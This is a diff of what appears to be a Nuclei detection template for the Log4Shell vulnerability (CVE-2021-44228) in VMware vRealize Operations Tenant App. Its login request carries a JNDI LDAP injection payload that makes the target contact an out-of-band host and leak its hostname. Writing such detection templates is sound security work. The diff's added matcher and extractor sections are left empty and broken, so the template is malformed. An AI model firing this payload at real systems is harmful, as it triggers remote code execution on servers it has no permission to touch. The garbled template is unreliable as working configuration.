@@ -18,10 +18,13 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
+    verified: true
     max-request: 1
     shodan-query: http.title:"vRealize Operations Tenant App"
-    verified: "true"
   tags: cve,cve2021,oast,rce,log4j,vmware,vrealize,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
 
 http:
   - raw:
@@ -32,25 +35,32 @@ http:
         Origin: {{RootURL}}
         Referer: {{RootURL}}/ui/
 
-        {"username":"${jndi:ldap://${hostName}.{{interactsh-url}}}","password":"admin"}
+        {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin"}
 
     matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol
         words:
-          - "dns"  # Confirms the DNS Interaction
+          - "dns" # Confirms the DNS Interaction
 
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
 
     extractors:
+      - type: kval
+        kval:
+
+
       - type: regex
+        group: 2
+        regex:
         part: interactsh_request
+
+      - type: regex
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
-
-# Enhanced by mp on 2022/04/05
+        part: interactsh_request
+# digest: 4a0a00473045022100955fc9cfb6a98cd3b34e6c9ebf1ba97a8e63456f8a030c1663f582913dfe0add02204043b64f7f09bcf8dee2b78f90dad14e8e0ae3aaeecd6cee9e7f8d79944e1b60:922c64590222798bb761d5b6d8e72950
